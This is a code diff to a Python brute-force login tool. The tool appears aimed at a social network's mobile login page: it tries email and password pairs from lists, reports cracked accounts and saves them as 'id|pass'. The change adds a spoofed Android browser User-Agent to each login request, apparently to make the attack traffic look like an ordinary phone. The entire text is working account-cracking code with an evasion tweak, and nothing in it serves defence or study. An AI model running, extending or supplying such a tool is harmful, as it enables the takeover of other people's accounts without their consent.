@@ -62,7 +62,7 @@ class asuBrute(threading.Thread):
 							"email":self._email,
 							"pass":self._pasw,
 							"login":self._submit
-						}
+						},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
 			).url
 			if "save-device" in self._req or "m_sess" in self._req:
 				print "\r[+] Found     : %s -> %s"%(self._email,
@@ -161,7 +161,7 @@ class thread:
 					"email":id.replace("\n",""),
 					"pass":ps,
 					"login":sb
-				}
+				},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
 		).url
 		if "save-device" in r or "m_sess" in r:
 			fo.append("%s|%s"%(id,ps))
